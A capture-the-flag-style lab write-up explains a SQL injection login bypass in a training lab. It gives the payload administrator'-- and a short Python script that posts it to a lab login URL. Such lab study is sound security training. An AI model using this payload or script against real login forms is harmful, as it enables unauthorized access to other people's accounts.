# Lab: SQL injection vulnerability allowing login bypass (Apprentice)

**Goal:** Log in as the `administrator` user.

**Vulnerable parameter:** `username` in login form.

## Vulnerability

The application executes something like:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

## Solution

1. Intercept the login POST request.
2. Set the username to:

```
administrator'--
```

3. Password can be anything (or empty).

Resulting query:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'anything'
```

The password check is commented out.

## Exploit Payload

**Username:** `administrator'--`  
**Password:** (any value)

## Python Exploit

See also the existing script in the repo root: `sql_injection_allowing_login_bypass.py`

```python
import requests

lab_url = "https://YOUR-LAB-ID.web-security-academy.net"
login_url = f"{lab_url}/login"

data = {
    "username": "administrator'--",
    "password": "anything"
}

s = requests.Session()
r = s.post(login_url, data=data, allow_redirects=True)
print(r.url)
print("Logged in as administrator" if "my-account" in r.url or "Administrator" in r.text else "Failed")
```
